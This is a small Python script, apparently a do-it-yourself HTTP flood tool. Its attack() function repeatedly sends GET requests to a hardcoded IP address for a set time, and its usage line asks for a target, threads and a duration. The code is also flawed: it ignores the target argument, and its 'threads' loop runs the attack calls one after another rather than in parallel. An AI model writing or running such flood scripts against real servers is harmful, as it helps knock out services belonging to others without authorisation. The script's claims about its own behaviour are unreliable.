# importing the requests library
import requests, sys, time

try:
    target = str(sys.argv[1])
    threads = int(sys.argv[2])
    timer = float(sys.argv[3])
except IndexError:
    print('\n[+] command used: python ' + sys.argv[0] + ' <target> <threads> <time>')

timeout = time.time() + 1 * timer


def attack():
    # api-endpoint
    while time.time() < timeout:
        URL = "http://54.151.131.69/"

        # location given here
        location = "delhi technological university"

        # defining a params dict for the parameters to be sent to the API
        PARAMS = {'address': location}

        # sending get request and saving the response as response object
        r = requests.get(url=URL, params=PARAMS)

        # extracting data in json format


for x in range(0, threads):
    attack()
